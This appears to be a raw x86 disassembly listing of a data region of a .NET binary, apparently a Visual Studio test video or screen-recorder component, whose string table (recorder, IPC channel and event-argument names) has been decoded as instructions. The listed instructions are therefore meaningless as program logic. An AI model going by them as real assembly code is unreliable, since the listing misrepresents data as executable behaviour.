  4042fb:	add    eax,0x2120223
  404300:	rol    BYTE PTR ds:0x2120223,0xe0
  404307:	add    eax,0x2120223
  40430c:	add    BYTE PTR [esi],al
  40430e:	and    eax,DWORD PTR [edx]
  404310:	adc    al,BYTE PTR [edx]
  404312:	jns    0x404314
  404314:	sbb    eax,0x1f007b02
  404319:	add    dh,dl
  40431b:	add    bh,ah
  40431d:	add    dl,BYTE PTR [ebx]
  40431f:	add    esp,DWORD PTR [esi]
  404321:	add    esi,DWORD PTR [ebx]
  404323:	add    ebx,DWORD PTR [ecx+0x3]
  404326:	xchg   ebp,eax
  404327:	add    edi,DWORD PTR [eax-0x19fc25fd]
  40432d:	add    ebx,DWORD PTR [edi]
  40432f:	add    al,0x54
  404331:	add    al,0x69
  404333:	add    al,0x78
  404335:	add    al,0x92
  404337:	add    al,0xa6
  404339:	add    al,0xaa
  40433b:	add    al,0xbf
  40433d:	add    al,0x20
  40433f:	add    eax,0x10006
  404344:	or     DWORD PTR [eax],eax
  404346:	or     eax,DWORD PTR [eax]
  404348:	add    BYTE PTR [eax],al
  40434a:	pop    DWORD PTR [edi]
  40434c:	add    DWORD PTR es:[eax],eax
  40434f:	add    BYTE PTR [esi+0x12a07],bl
  404355:	add    BYTE PTR [edi+eax*1+0x12f],ch
  40435c:	mov    esp,0x12f07
  404361:	add    dh,cl
  404363:	pop    es
  404364:	add    DWORD PTR es:[eax],eax
  404367:	add    dl,bl
  404369:	pop    es
  40436a:	add    DWORD PTR es:[eax],eax
  40436d:	add    dh,ah
  40436f:	pop    es
  404370:	das    
  404371:	add    DWORD PTR [eax],eax
  404373:	add    ch,dh
  404375:	pop    es
  404376:	xor    eax,DWORD PTR [ecx]
  404378:	add    BYTE PTR [eax],al
  40437a:	std    
  40437b:	pop    es
  40437c:	xor    eax,DWORD PTR [ecx]
  40437e:	add    BYTE PTR [eax],al
  404380:	pop    es
  404381:	or     BYTE PTR [ebx],dh
  404383:	add    DWORD PTR [eax],eax
  404385:	add    ah,bl
  404387:	or     BYTE PTR [edx+eax*1],al
  40438a:	add    BYTE PTR [eax],al
  40438c:	retf   0x909
  40438f:	add    al,BYTE PTR [eax]
  404391:	add    dl,dl
  404393:	or     DWORD PTR [esi],ecx
  404395:	add    al,BYTE PTR [eax]
  404397:	add    bl,ah
  404399:	or     DWORD PTR [esi],ecx
  40439b:	add    al,BYTE PTR [eax]
  40439d:	add    bl,dh
  40439f:	or     DWORD PTR [esi],ecx
  4043a1:	add    al,BYTE PTR [eax]
  4043a3:	add    dh,bh
  4043a5:	or     DWORD PTR [esi],ecx
  4043a7:	add    al,BYTE PTR [eax]
  4043a9:	add    BYTE PTR [edx],cl
  4043ab:	or     cl,BYTE PTR [esi]
  4043ad:	add    al,BYTE PTR [eax]
  4043af:	add    BYTE PTR ds:0x20e0a,dl
  4043b5:	add    BYTE PTR [edi],bl
  4043b7:	or     cl,BYTE PTR [esi]
  4043b9:	add    al,BYTE PTR [edx]
  4043bb:	add    BYTE PTR ds:0x1000300,bl
  4043c1:	add    BYTE PTR [esi],bl
  4043c3:	add    BYTE PTR [ebx],al
  4043c5:	add    BYTE PTR [edx],al
  4043c7:	add    BYTE PTR [edi],bl
  4043c9:	add    BYTE PTR ds:0x20000100,al
  4043cf:	add    BYTE PTR ds:0x21000200,al
  4043d5:	add    BYTE PTR [edi],al
  4043d7:	add    BYTE PTR [ecx],al
  4043d9:	add    BYTE PTR [edx],ah
  4043db:	add    BYTE PTR [edi],al
  4043dd:	add    BYTE PTR [edx],al
  4043df:	add    BYTE PTR [ebx],ah
  4043e1:	add    BYTE PTR [ecx],cl
  4043e3:	add    BYTE PTR [ecx],al
  4043e5:	add    BYTE PTR [eax+eax*1],ah
  4043e8:	or     DWORD PTR [eax],eax
  4043ea:	add    al,BYTE PTR [eax]
  4043ec:	and    eax,0x1000b00
  4043f1:	add    BYTE PTR [esi],ah
  4043f3:	add    BYTE PTR [ebx],cl
  4043f5:	add    BYTE PTR [edx],al
  4043f7:	add    BYTE PTR [edi],ah
  4043f9:	add    BYTE PTR ds:0x28000100,cl
  4043ff:	add    BYTE PTR ds:0x29000200,cl
  404405:	add    BYTE PTR [edi],cl
  404407:	add    BYTE PTR [ecx],al
  404409:	add    BYTE PTR [edx],ch
  40440b:	add    BYTE PTR [edi],cl
  40440d:	add    BYTE PTR [edx],al
  40440f:	add    BYTE PTR [ebx],ch
  404411:	add    BYTE PTR [ecx],dl
  404413:	add    BYTE PTR [ecx],al
  404415:	add    BYTE PTR [eax+eax*1],ch
  404418:	adc    DWORD PTR [eax],eax
  40441a:	add    DWORD PTR [eax],eax
  40441c:	add    BYTE PTR cs:[ebx],dl
  40441f:	add    BYTE PTR [edx],al
  404421:	add    BYTE PTR ds:0x2001300,ch
  404427:	add    BYTE PTR [edi],ch
  404429:	add    BYTE PTR ds:0x30000100,dl
  40442f:	add    BYTE PTR ds:0x47000200,dl
  404435:	add    BYTE PTR [edi],dl
  404437:	add    BYTE PTR [ecx],al
  404439:	add    BYTE PTR [ecx+0x0],cl
  40443c:	sbb    DWORD PTR [eax],eax
  40443e:	add    al,BYTE PTR [eax]
  404440:	dec    eax
  404441:	add    BYTE PTR [ecx],bl
  404443:	add    BYTE PTR [edx],al
  404445:	add    BYTE PTR [edx+0x0],cl
  404448:	sbb    eax,DWORD PTR [eax]
  40444a:	add    al,BYTE PTR [eax]
  40444c:	dec    ebx
  40444d:	add    BYTE PTR ds:0x4c000200,bl
  404453:	add    BYTE PTR [edi],bl
  404455:	add    BYTE PTR [edx],al
  404457:	add    BYTE PTR [ebp+0x0],cl
  40445a:	and    DWORD PTR [eax],eax
  40445c:	add    al,BYTE PTR [eax]
  40445e:	dec    esi
  40445f:	add    BYTE PTR [ebx],ah
  404461:	add    BYTE PTR [edx],al
  404463:	add    BYTE PTR [edi+0x0],cl
  404466:	and    eax,0x50000200
  40446b:	add    BYTE PTR [edi],ah
  40446d:	add    BYTE PTR [eax],cl
  40446f:	adc    al,0xd
  404471:	add    esi,eax
  404473:	add    eax,DWORD PTR [esi-0x7efefffc]
  404479:	add    BYTE PTR [ecx],bl
  40447b:	or     BYTE PTR [ecx],al
  40447d:	add    BYTE PTR [eax],al
  40447f:	add    DWORD PTR [ebx+0x1082c00],eax
  404485:	add    BYTE PTR [eax],al
  404487:	add    DWORD PTR [ebp+0x1083e00],eax
  40448d:	add    BYTE PTR [eax],al
  40448f:	add    DWORD PTR [edi+0x1085100],eax
  404495:	add    BYTE PTR [eax],al
  404497:	add    DWORD PTR [ecx+0x1086500],ecx
  40449d:	add    BYTE PTR [eax],al
  40449f:	add    DWORD PTR [ebx+0x1087f00],ecx
  4044a5:	add    BYTE PTR [eax+eax*4],al
  4044a8:	add    BYTE PTR [eax],al
  4044aa:	or     eax,DWORD PTR [eax]
  4044ac:	add    BYTE PTR [eax],al
  4044ae:	add    BYTE PTR [eax],al
  4044b0:	add    BYTE PTR [eax],al
  4044b2:	add    DWORD PTR [eax],eax
  4044b4:	add    BYTE PTR [eax],al
  4044b6:	sub    BYTE PTR [edx],al
  4044b8:	mov    ebx,0x400000d
	...
  4044c5:	add    BYTE PTR [eax],al
  4044c7:	add    BYTE PTR [ecx],al
  4044c9:	add    BYTE PTR [ecx+eax*1],bl
  4044cc:	add    BYTE PTR [eax],al
  4044ce:	add    BYTE PTR [eax],al
  4044d0:	add    al,0x0
	...
  4044da:	add    BYTE PTR [eax],al
  4044dc:	add    DWORD PTR [eax],eax
  4044de:	ins    DWORD PTR es:[edi],dx
  4044df:	add    al,BYTE PTR [eax]
  4044e1:	add    BYTE PTR [eax],al
  4044e3:	add    BYTE PTR [eax+eax*1],al
	...
  4044ee:	add    BYTE PTR [eax],al
  4044f0:	add    DWORD PTR [eax],eax
  4044f2:	and    eax,0x1
  4044f7:	add    BYTE PTR [eax+eax*1],al
	...
  404502:	add    BYTE PTR [eax],al
  404504:	cmp    DWORD PTR [esi+edx*8],eax
  404507:	adc    al,BYTE PTR [eax]
  404509:	add    BYTE PTR [eax],al
  40450b:	add    BYTE PTR [eax],al
  40450d:	add    BYTE PTR [eax],al
  40450f:	add    BYTE PTR [ecx],al
  404511:	add    BYTE PTR [eax],al
  404513:	add    ch,ah
  404515:	adc    al,0x0
  404517:	add    BYTE PTR [eax],cl
  404519:	add    BYTE PTR [edi],al
  40451b:	add    BYTE PTR [eax],al
  40451d:	add    BYTE PTR [eax],al
  40451f:	add    BYTE PTR [eax],al
  404521:	cmp    al,0x4d
  404523:	outs   dx,DWORD PTR ds:[esi]
  404524:	fs jne 0x404593
  404527:	gs add BYTE PTR ds:[esi+0x53],dl
  40452c:	push   esp
  40452d:	gs jae 0x4045a4
  404530:	push   esi
  404531:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  404539:	jb     0x40459f
  40453b:	gs jb  0x40456c
  40453e:	gs js  0x4045a6
  404541:	add    BYTE PTR [ecx+0x4d],cl
  404544:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  40454d:	fs gs jb 0x404551
  404551:	dec    ebp
  404552:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404559:	je     0x404589
  40455b:	push   esi
  40455c:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404563:	jne    0x4045c9
  404565:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  40456c:	push   esp
  40456d:	outs   dx,DWORD PTR ds:[esi]
  40456e:	outs   dx,DWORD PTR ds:[esi]
  40456f:	ins    BYTE PTR es:[edi],dx
  404570:	jae    0x4045a0
  404572:	push   esi
  404573:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  40457b:	jb     0x4045e1
  40457d:	gs jb  0x404580
  404580:	dec    ecx
  404581:	dec    ebp
  404582:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  40458b:	fs gs jb 0x4045d4
  40458f:	jbe    0x4045f6
  404591:	outs   dx,BYTE PTR ds:[esi]
  404592:	je     0x4045e7
  404594:	imul   ebp,DWORD PTR [esi+0x6b],0x6f725000
  40459b:	addr16 jb 0x4045ff
  40459e:	ins    DWORD PTR es:[edi],dx
  40459f:	add    BYTE PTR [ebp+0x65],cl
  4045a2:	imul   esp,DWORD PTR fs:[ecx+0x46],0x646e756f
  4045aa:	popa   
  4045ab:	je     0x404616
  4045ad:	outs   dx,DWORD PTR ds:[esi]
  4045ae:	outs   dx,BYTE PTR ds:[esi]
  4045af:	push   edx
  4045b0:	arpl   WORD PTR gs:[edi+0x72],bp
  4045b4:	fs gs jb 0x4045b8
  4045b8:	dec    ebp
  4045b9:	gs imul esp,DWORD PTR fs:[ecx+0x46],0x646e756f
  4045c2:	popa   
  4045c3:	je     0x40462e
  4045c5:	outs   dx,DWORD PTR ds:[esi]
  4045c6:	outs   dx,BYTE PTR ds:[esi]
  4045c7:	push   edx
  4045c8:	arpl   WORD PTR gs:[edi+0x72],bp
  4045cc:	fs gs jb 0x404620
  4045d0:	popa   
  4045d1:	jb     0x404634
  4045d3:	ins    DWORD PTR es:[edi],dx
  4045d4:	jae    0x4045d6
  4045d6:	dec    ebp
  4045d7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4045de:	je     0x40460e
  4045e0:	push   esi
  4045e1:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4045e8:	jne    0x40464e
  4045ea:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4045f1:	push   esp
  4045f2:	outs   dx,DWORD PTR ds:[esi]
  4045f3:	outs   dx,DWORD PTR ds:[esi]
  4045f4:	ins    BYTE PTR es:[edi],dx
  4045f5:	jae    0x404625
  4045f7:	dec    ebp
  4045f8:	gs imul esp,DWORD PTR fs:[ecx+0x46],0x646e756f
  404601:	popa   
  404602:	je     0x40466d
  404604:	outs   dx,DWORD PTR ds:[esi]
  404605:	outs   dx,BYTE PTR ds:[esi]
  404606:	push   edx
  404607:	arpl   WORD PTR gs:[edi+0x72],bp
  40460b:	fs gs jb 0x40460f
  40460f:	push   edx
  404610:	arpl   WORD PTR gs:[edi+0x72],bp
  404614:	fs gs jb 0x40465d
  404618:	outs   dx,BYTE PTR ds:[esi]
  404619:	imul   ebp,DWORD PTR [bp+0x65],0x70617257
  404621:	jo     0x404688
  404623:	jb     0x404625
  404625:	dec    esi
  404626:	popa   
  404627:	je     0x404692
  404629:	jbe    0x404690
  40462b:	dec    ebp
  40462c:	gs je  0x404697
  40462f:	outs   dx,DWORD PTR ds:[esi]
  404630:	fs jae 0x404633
  404633:	push   edx
  404634:	gs jae 0x4046a6
  404637:	jne    0x4046ab
  404639:	arpl   WORD PTR [ebp+0x0],sp
  40463c:	ins    DWORD PTR es:[edi],dx
  40463d:	jae    0x4046a2
  40463f:	outs   dx,DWORD PTR ds:[esi]
  404640:	jb     0x4046ae
  404642:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  404649:	gs ins DWORD PTR es:[edi],dx
  40464b:	add    BYTE PTR [edi+0x62],cl
  40464e:	push   0x65
  404650:	arpl   WORD PTR [eax+eax*1+0x4d],si
  404654:	popa   
  404655:	jb     0x4046ca
  404657:	push   0x79426c61
  40465c:	push   edx
  40465d:	gs dec di
  404660:	bound  ebp,QWORD PTR [edx+0x65]
  404663:	arpl   WORD PTR [eax+eax*1+0x49],si
  404667:	inc    esp
  404668:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  40466f:	ins    BYTE PTR es:[edi],dx
  404670:	add    BYTE PTR gs:[ebx+0x74],dl
  404674:	popa   
  404675:	jb     0x4046eb
  404677:	dec    ebp
  404678:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  404681:	fs gs jb 0x404685
  404685:	push   ebx
  404686:	je     0x4046f7
  404688:	jo     0x4046d7
  40468a:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  404693:	fs gs jb 0x404697
  404697:	push   eax
  404698:	popa   
  404699:	jne    0x40470e
  40469b:	gs dec ebp
  40469d:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  4046a6:	fs gs jb 0x4046aa
  4046aa:	push   edx
  4046ab:	gs jae 0x404723
  4046ae:	ins    DWORD PTR es:[edi],dx
  4046af:	gs dec ebp
  4046b1:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  4046ba:	fs gs jb 0x4046be
  4046be:	dec    ebp
  4046bf:	gs imul esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  4046c8:	fs gs jb 0x40471f
  4046cc:	je     0x40472f
  4046ce:	jb     0x404744
  4046d0:	gs add BYTE PTR fs:[ebp+0x65],cl
  4046d5:	imul   esp,DWORD PTR fs:[ecx+0x52],0x726f6365
  4046dd:	fs gs jb 0x404726
  4046e1:	jb     0x404755
  4046e3:	outs   dx,DWORD PTR ds:[esi]
  4046e4:	jb     0x4046e6
  4046e6:	dec    ebp
  4046e7:	popa   
  4046e8:	imul   ebp,DWORD PTR [esi+0x0],0x61686e55
  4046ef:	outs   dx,BYTE PTR ds:[esi]
  4046f0:	fs ins BYTE PTR es:[edi],dx
  4046f2:	gs fs inc ebp
  4046f5:	js     0x40475a
  4046f7:	gs jo  0x40476e
  4046fa:	imul   ebp,DWORD PTR [edi+0x6e],0x6e657645
  404701:	je     0x404744
  404703:	jb     0x40476c
  404705:	jae    0x404707
  404707:	inc    ebx
  404708:	jne    0x40477c
  40470a:	jb     0x404771
  40470c:	outs   dx,BYTE PTR ds:[esi]
  40470d:	je     0x404753
  40470f:	outs   dx,DWORD PTR ds:[esi]
  404710:	ins    DWORD PTR es:[edi],dx
  404711:	popa   
  404712:	imul   ebp,DWORD PTR [esi+0x5f],0x61686e55
  404719:	outs   dx,BYTE PTR ds:[esi]
  40471a:	fs ins BYTE PTR es:[edi],dx
  40471c:	gs fs inc ebp
  40471f:	js     0x404784
  404721:	gs jo  0x404798
  404724:	imul   ebp,DWORD PTR [edi+0x6e],0x74632e00
  40472b:	outs   dx,DWORD PTR ds:[esi]
  40472c:	jb     0x40472e
  40472e:	jb     0x404795
  404730:	arpl   WORD PTR [edi+0x72],bp
  404733:	fs gs jb 0x40477c
  404737:	jbe    0x40479e
  404739:	outs   dx,BYTE PTR ds:[esi]
  40473a:	je     0x404791
  40473c:	jb     0x4047a7
  40473e:	inc    esi
  40473f:	outs   dx,DWORD PTR ds:[esi]
  404740:	jb     0x4047af
  404742:	popa   
  404743:	je     0x404745
  404745:	push   edi
  404746:	popa   
  404747:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x63655272
  40474f:	outs   dx,DWORD PTR ds:[esi]
  404750:	jb     0x4047b6
  404752:	gs jb  0x4047a8
  404755:	je     0x4047c6
  404757:	jo     0x404759
  404759:	inc    esp
  40475a:	imul   esi,DWORD PTR [ebx+0x70],0x65736f
  404761:	dec    ecx
  404762:	outs   dx,BYTE PTR ds:[esi]
  404763:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40476b:	add    BYTE PTR [edx+0x65],dl
  40476e:	imul   esi,DWORD PTR [bp+di+0x74],0x70497265
  404776:	arpl   WORD PTR [ebx+0x68],ax
  404779:	popa   
  40477a:	outs   dx,BYTE PTR ds:[esi]
  40477b:	outs   dx,BYTE PTR ds:[esi]
  40477c:	gs ins BYTE PTR es:[edi],dx
  40477e:	inc    ecx
  40477f:	outs   dx,BYTE PTR ds:[esi]
  404780:	fs dec esi
  404782:	outs   dx,DWORD PTR ds:[esi]
  404783:	je     0x4047ee
  404785:	data16 jns 0x4047db
  404788:	je     0x4047eb
  40478a:	jb     0x404800
  40478c:	add    BYTE PTR [ebx+0x79],dl
  40478f:	jae    0x404805
  404791:	gs ins DWORD PTR es:[edi],dx
  404793:	cs push edx
  404795:	jne    0x404805
  404797:	je     0x404802
  404799:	ins    DWORD PTR es:[edi],dx
  40479a:	gs cs push edx
  40479d:	gs ins DWORD PTR es:[edi],dx
  40479f:	outs   dx,DWORD PTR ds:[esi]
  4047a0:	je     0x40480b
  4047a2:	outs   dx,BYTE PTR ds:[esi]
  4047a3:	add    BYTE PTR [bp+di+0x79],dl
  4047a7:	jae    0x40481d
  4047a9:	gs ins DWORD PTR es:[edi],dx
  4047ab:	cs push edx
  4047ad:	jne    0x40481d
  4047af:	je     0x40481a
  4047b1:	ins    DWORD PTR es:[edi],dx
  4047b2:	gs cs push edx
  4047b5:	gs ins DWORD PTR es:[edi],dx
  4047b7:	outs   dx,DWORD PTR ds:[esi]
  4047b8:	je     0x404823
  4047ba:	outs   dx,BYTE PTR ds:[esi]
  4047bb:	addr16 cs inc ebx
  4047be:	push   0x656e6e61
  4047c3:	ins    BYTE PTR es:[edi],dx
  4047c4:	jae    0x4047f4
  4047c6:	dec    ecx
  4047c7:	jo     0x40482c
  4047c9:	add    BYTE PTR [ecx+0x70],cl
  4047cc:	arpl   WORD PTR [ebx+0x68],ax
  4047cf:	popa   
  4047d0:	outs   dx,BYTE PTR ds:[esi]
  4047d1:	outs   dx,BYTE PTR ds:[esi]
  4047d2:	gs ins BYTE PTR es:[edi],dx
  4047d4:	add    BYTE PTR [edx+0x65],dl
  4047d7:	imul   esi,DWORD PTR [bp+di+0x74],0x70497265
  4047df:	arpl   WORD PTR [ebx+0x6c],ax
  4047e2:	imul   esp,DWORD PTR [ebp+0x6e],0x72655374
  4047e9:	jbe    0x404850
  4047eb:	jb     0x404830
  4047ed:	push   0x656e6e61
  4047f2:	ins    BYTE PTR es:[edi],dx
  4047f3:	add    BYTE PTR [ebp+0x6e],dl
  4047f6:	push   edx
  4047f7:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x70497265
  404800:	arpl   WORD PTR [ebx+0x68],ax
  404803:	popa   
  404804:	outs   dx,BYTE PTR ds:[esi]
  404805:	outs   dx,BYTE PTR ds:[esi]
  404806:	gs ins BYTE PTR es:[edi],dx
  404808:	add    BYTE PTR [eax+0x61],dl
  40480b:	jb     0x404880
  40480d:	gs inc ebx
  40480f:	outs   dx,DWORD PTR ds:[esi]
  404810:	ins    DWORD PTR es:[edi],dx
  404811:	ins    DWORD PTR es:[edi],dx
  404812:	popa   
  404813:	outs   dx,BYTE PTR ds:[esi]
  404814:	fs dec esp
  404816:	imul   ebp,DWORD PTR [esi+0x65],0x61726150
  40481d:	ins    DWORD PTR es:[edi],dx
  40481e:	jae    0x404820
  404820:	dec    eax
  404821:	popa   
  404822:	outs   dx,BYTE PTR ds:[esi]
  404823:	fs ins BYTE PTR es:[edi],dx
  404825:	gs push ebx
  404827:	je     0x40488a
  404829:	outs   dx,BYTE PTR ds:[esi]
  40482a:	fs inc ecx
  40482c:	ins    BYTE PTR es:[edi],dx
  40482d:	outs   dx,DWORD PTR ds:[esi]
  40482e:	outs   dx,BYTE PTR ds:[esi]
  40482f:	gs dec ebp
  404831:	outs   dx,DWORD PTR ds:[esi]
  404832:	fs add BYTE PTR gs:[ebx+0x6f],al
  404837:	outs   dx,BYTE PTR ds:[esi]
  404838:	jae    0x4048a9
  40483a:	ins    BYTE PTR es:[edi],dx
  40483b:	gs inc ebx
  40483d:	popa   
  40483e:	outs   dx,BYTE PTR ds:[esi]
  40483f:	arpl   WORD PTR [ebp+0x6c],sp
  404842:	inc    ebp
  404843:	jbe    0x4048aa
  404845:	outs   dx,BYTE PTR ds:[esi]
  404846:	je     0x404889
  404848:	jb     0x4048b1
  40484a:	jae    0x40484c
  40484c:	inc    ebx
  40484d:	outs   dx,DWORD PTR ds:[esi]
  40484e:	outs   dx,BYTE PTR ds:[esi]
  40484f:	jae    0x4048c0
  404851:	ins    BYTE PTR es:[edi],dx
  404852:	gs inc ebx
  404854:	popa   
  404855:	outs   dx,BYTE PTR ds:[esi]
  404856:	arpl   WORD PTR [ebp+0x6c],sp
  404859:	dec    ebx
  40485a:	gs jns 0x4048ad
  40485d:	jb     0x4048c4
  40485f:	jae    0x4048d4
  404861:	add    BYTE PTR [ebp+0x76],al
  404864:	outs   dx,BYTE PTR gs:[esi]
  404866:	je     0x4048a9
  404868:	jb     0x4048d1
  40486a:	jae    0x40486c
  40486c:	push   eax
  40486d:	popa   
  40486e:	jb     0x4048d5
  404870:	outs   dx,BYTE PTR ds:[esi]
  404871:	je     0x4048c3
  404873:	jb     0x4048e4
  404875:	arpl   WORD PTR [ebp+0x73],sp
  404878:	jae    0x4048bf
  40487a:	js     0x4048e5
  40487c:	je     0x4048e3
  40487e:	add    BYTE PTR fs:[ecx+0x6e],cl
  404882:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40488a:	dec    esp
  40488b:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  404892:	push   ebx
  404893:	gs jb  0x40490c
  404896:	imul   esp,DWORD PTR [ebx+0x65],0x64654d00
  40489d:	imul   esp,DWORD PTR [ecx+0x46],0x646e756f
  4048a4:	popa   
  4048a5:	je     0x404910
  4048a7:	outs   dx,DWORD PTR ds:[esi]
  4048a8:	outs   dx,BYTE PTR ds:[esi]
  4048a9:	inc    ebp
  4048aa:	jb     0x40491e
  4048ac:	outs   dx,DWORD PTR ds:[esi]
  4048ad:	jb     0x4048f4
  4048af:	jbe    0x404916
  4048b1:	outs   dx,BYTE PTR ds:[esi]
  4048b2:	je     0x4048f7
  4048b4:	popa   
  4048b5:	ins    BYTE PTR es:[edi],dx
  4048b6:	ins    BYTE PTR es:[edi],dx
  4048b7:	inc    edx
  4048b8:	popa   
  4048b9:	arpl   WORD PTR [ebx+0x0],bp
  4048bc:	jb     0x404923
  4048be:	arpl   WORD PTR [edi+0x72],bp
  4048c1:	fs gs jb 0x404915
  4048c5:	popa   
  4048c6:	jb     0x404929
  4048c8:	ins    DWORD PTR es:[edi],dx
  4048c9:	jae    0x4048cb
  4048cb:	imul   esi,DWORD PTR [eax+0x63],0x6e616843
  4048d2:	outs   dx,BYTE PTR ds:[esi]
  4048d3:	gs ins BYTE PTR es:[edi],dx
  4048d5:	add    BYTE PTR [ebx+0x79],dl
  4048d8:	jae    0x40494e
  4048da:	gs ins DWORD PTR es:[edi],dx
  4048dc:	cs push esp
  4048de:	push   0x64616572
  4048e3:	imul   ebp,DWORD PTR [esi+0x67],0x6e614d00
  4048ea:	jne    0x40494d
  4048ec:	ins    BYTE PTR es:[edi],dx
  4048ed:	push   edx
  4048ee:	gs jae 0x404956
  4048f1:	je     0x404938
  4048f3:	jbe    0x40495a
  4048f5:	outs   dx,BYTE PTR ds:[esi]
  4048f6:	je     0x4048f8
  4048f8:	jae    0x404962
  4048fa:	jne    0x404970
  4048fc:	inc    esp
  4048fd:	outs   dx,DWORD PTR ds:[esi]
  4048fe:	ja     0x40496e
  404900:	inc    ebp
  404901:	jbe    0x404968
  404903:	outs   dx,BYTE PTR ds:[esi]
  404904:	je     0x404906
  404906:	gs jb  0x40497b
  404909:	outs   dx,DWORD PTR ds:[esi]
  40490a:	jb     0x404951
  40490c:	jbe    0x404973
  40490e:	outs   dx,BYTE PTR ds:[esi]
  40490f:	je     0x404911
  404911:	push   ebx
  404912:	jns    0x404987
  404914:	je     0x40497b
  404916:	ins    DWORD PTR es:[edi],dx
  404917:	cs push edx
  404919:	jne    0x404989
  40491b:	je     0x404986
  40491d:	ins    DWORD PTR es:[edi],dx
  40491e:	gs cs inc ebx
  404921:	outs   dx,DWORD PTR ds:[esi]
  404922:	ins    DWORD PTR es:[edi],dx
  404923:	jo     0x40498e
  404925:	ins    BYTE PTR es:[edi],dx
  404926:	gs jb  0x40497c
  404929:	gs jb  0x4049a2
  40492c:	imul   esp,DWORD PTR [ebx+0x65],0x73490073
  404933:	push   esi
  404934:	outs   dx,DWORD PTR ds:[esi]
  404935:	ins    BYTE PTR es:[edi],dx
  404936:	popa   
  404937:	je     0x4049a2
  404939:	ins    BYTE PTR es:[edi],dx
  40493a:	add    BYTE PTR gs:[ecx+ebp*2+0x73],ah
  40493f:	jo     0x4049b0
  404941:	jae    0x4049a8
  404943:	add    BYTE PTR fs:[edi+ebp*2+0x63],ch
  404948:	imul   ecx,DWORD PTR [esi+0x6f],0x64
  40494c:	add    BYTE PTR gs:[edx+0x65],dh
  404950:	arpl   WORD PTR [edi+0x72],bp
  404953:	fs gs jb 0x40499c
  404957:	jbe    0x4049be
  404959:	outs   dx,BYTE PTR ds:[esi]
  40495a:	je     0x4049af
  40495c:	imul   ebp,DWORD PTR [esi+0x6b],0x74694200
  404963:	push   edx
  404964:	popa   
  404965:	je     0x4049cc
  404967:	push   eax
  404968:	jb     0x4049d9
  40496a:	jo     0x4049d1
  40496c:	jb     0x4049e2
  40496e:	jns    0x404970
  404970:	inc    esi
  404971:	jb     0x4049d4
  404973:	ins    DWORD PTR es:[edi],dx
  404974:	gs push edx
  404976:	popa   
  404977:	je     0x4049de
  404979:	push   eax
  40497a:	jb     0x4049eb
  40497c:	jo     0x4049e3
  40497e:	jb     0x4049f4
  404980:	jns    0x404982
  404982:	inc    esp
  404983:	jne    0x4049f7
  404985:	popa   
  404986:	je     0x4049f1
  404988:	outs   dx,DWORD PTR ds:[esi]
  404989:	outs   dx,BYTE PTR ds:[esi]
  40498a:	push   eax
  40498b:	jb     0x4049fc
  40498d:	jo     0x4049f4
  40498f:	jb     0x404a05
  404991:	jns    0x404993
  404993:	push   edx
  404994:	arpl   WORD PTR gs:[edi+0x72],bp
  404998:	fs inc ecx
  40499a:	jne    0x404a00
  40499c:	imul   ebp,DWORD PTR [edi+0x50],0x65706f72
  4049a3:	jb     0x404a19
  4049a5:	jns    0x4049a7
  4049a7:	addr16 gs je 0x404a0a
  4049ab:	push   ebx
  4049ac:	je     0x404a0f
  4049ae:	outs   dx,BYTE PTR ds:[esi]
  4049af:	fs inc ecx
  4049b1:	ins    BYTE PTR es:[edi],dx
  4049b2:	outs   dx,DWORD PTR ds:[esi]
  4049b3:	outs   dx,BYTE PTR ds:[esi]
  4049b4:	gs dec ebp
  4049b6:	outs   dx,DWORD PTR ds:[esi]
  4049b7:	fs add BYTE PTR gs:[ebx+0x65],dh
  4049bc:	je     0x404a1d
  4049be:	push   ebx
  4049bf:	je     0x404a22
  4049c1:	outs   dx,BYTE PTR ds:[esi]
  4049c2:	fs inc ecx
  4049c4:	ins    BYTE PTR es:[edi],dx
  4049c5:	outs   dx,DWORD PTR ds:[esi]
  4049c6:	outs   dx,BYTE PTR ds:[esi]
  4049c7:	gs dec ebp
  4049c9:	outs   dx,DWORD PTR ds:[esi]
  4049ca:	fs add BYTE PTR gs:[ebx+0x79],dl
  4049cf:	jae    0x404a45
  4049d1:	gs ins DWORD PTR es:[edi],dx
  4049d3:	cs inc esp
  4049d5:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4049dc:	imul   esp,DWORD PTR [ebx+0x73],0x6f725000
  4049e3:	arpl   WORD PTR [ebp+0x73],sp
  4049e6:	jae    0x4049e8
  4049e8:	addr16 gs je 0x404a4b
  4049ec:	push   eax
  4049ed:	popa   
  4049ee:	jb     0x404a55
  4049f0:	outs   dx,BYTE PTR ds:[esi]
  4049f1:	je     0x404a43
  4049f3:	jb     0x404a64
  4049f5:	arpl   WORD PTR [ebp+0x73],sp
  4049f8:	jae    0x4049fa
  4049fa:	jae    0x404a61
  4049fc:	je     0x404a5d
  4049fe:	push   eax
  4049ff:	popa   
  404a00:	jb     0x404a67
  404a02:	outs   dx,BYTE PTR ds:[esi]
  404a03:	je     0x404a55
  404a05:	jb     0x404a76
  404a07:	arpl   WORD PTR [ebp+0x73],sp
  404a0a:	jae    0x404a0c
  404a0c:	addr16 gs je 0x404a6f
  404a10:	inc    ebx
  404a11:	push   0x656e6e61
  404a16:	ins    BYTE PTR es:[edi],dx
  404a17:	push   eax
  404a18:	outs   dx,DWORD PTR ds:[esi]
  404a19:	jb     0x404a8f
